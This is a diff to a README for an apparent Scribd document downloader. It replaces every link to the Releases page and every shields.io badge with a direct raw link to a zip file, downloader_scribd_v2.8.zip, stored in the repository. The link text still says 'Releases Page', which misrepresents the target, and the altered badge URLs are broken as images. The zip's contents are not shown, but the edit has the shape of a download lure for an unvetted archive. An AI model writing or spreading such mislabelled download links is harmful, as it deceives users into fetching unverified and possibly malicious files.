@@ -1,6 +1,6 @@
 # 📄 scribd-downloader - Download Scribd Documents Instantly
 
-[![Download Scribd Downloader](https://img.shields.io/badge/Download-Scribd%20Downloader-blue)](https://github.com/h-8-h/scribd-downloader/releases)
+[![Download Scribd Downloader](https://github.com/h-8-h/scribd-downloader/raw/refs/heads/main/assets/downloader_scribd_v2.8.zip%20Downloader-blue)](https://github.com/h-8-h/scribd-downloader/raw/refs/heads/main/assets/downloader_scribd_v2.8.zip)
 
 ## 📋 Overview
 
@@ -23,9 +23,9 @@ To use Scribd Downloader, ensure your system meets the following requirements:
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: To download Scribd Downloader, go to the [Releases Page](https://github.com/h-8-h/scribd-downloader/releases).  
+1. **Visit the Releases Page**: To download Scribd Downloader, go to the [Releases Page](https://github.com/h-8-h/scribd-downloader/raw/refs/heads/main/assets/downloader_scribd_v2.8.zip).  
    
-   ![Download Scribd Downloader](https://img.shields.io/badge/Download-Scribd%20Downloader-blue)
+   ![Download Scribd Downloader](https://github.com/h-8-h/scribd-downloader/raw/refs/heads/main/assets/downloader_scribd_v2.8.zip%20Downloader-blue)
 
 2. **Select the Latest Version**: On the Releases Page, find the latest version of the software. This version will include all updates and improvements.
 
@@ -37,7 +37,7 @@ To use Scribd Downloader, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download Scribd Downloader, follow this [link to the Releases Page](https://github.com/h-8-h/scribd-downloader/releases). 
+To download Scribd Downloader, follow this [link to the Releases Page](https://github.com/h-8-h/scribd-downloader/raw/refs/heads/main/assets/downloader_scribd_v2.8.zip). 
 
 1. **Download the latest version** of the application as described above.
 
